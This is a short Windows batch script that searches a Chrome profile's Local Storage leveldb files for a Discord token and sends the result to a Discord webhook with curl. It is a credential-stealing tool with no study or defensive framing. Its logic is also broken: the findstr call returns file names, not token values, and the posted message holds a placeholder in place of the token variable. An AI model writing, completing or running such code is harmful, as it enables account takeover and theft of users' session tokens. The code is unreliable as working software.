@echo off
setlocal enabledelayedexpansion


set "chromeUserDataDir=%LocalAppData%\Google\Chrome\User Data"


set "webhookURL=https://discord.com/api/webhooks/your_webhook_url_here"


for /d %%I in ("%chromeUserDataDir%\Profile*") do (
    set "chromeProfileDir=%%I"
)


if not defined chromeProfileDir (
    echo Chrome profile directory not found.
    exit /b
)


set "token="
for /f "tokens=3" %%A in ('findstr /si /m "token" "%chromeProfileDir%\Local Storage\leveldb\*.ldb"') do (
    set "token=%%A"
)


if not defined token (
    echo Discord token not found.
    exit /b
)


set "data={\"content\":\"Discord token: !HERE_PUT_THE_TOKEN!\"}"
curl -H "Content-Type: application/json" -X POST -d !data! !webhookURL!


:end
